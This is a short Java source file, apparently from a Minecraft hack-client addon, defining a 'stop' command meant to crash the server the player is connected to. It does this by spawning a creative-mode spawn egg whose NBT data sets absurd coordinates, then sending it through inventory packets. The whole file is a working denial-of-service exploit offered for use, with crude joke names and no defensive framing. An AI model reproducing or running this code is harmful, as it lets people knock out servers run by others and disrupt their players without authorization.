package uwu.taxevasion.allahhack.commands;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.systems.commands.Command;
import net.minecraft.command.CommandSource;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.StringNbtReader;

import static com.mojang.brigadier.Command.SINGLE_SUCCESS;

public class StopCommand extends Command {
    public StopCommand() {
        super("stop", "allah stops the server");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.executes(context -> {
            ItemStack sex = new ItemStack(Items.SALMON_SPAWN_EGG);
            sex.setNbt(StringNbtReader.parse("{EntityTag:{Pos:[420420420,133333337,69696969]}}"));
            mc.interactionManager.clickCreativeStack(sex, 36 + mc.player.getInventory().selectedSlot);
            mc.interactionManager.clickCreativeStack(ItemStack.EMPTY, 36 + mc.player.getInventory().selectedSlot);
           return SINGLE_SUCCESS;
        });
    }
}
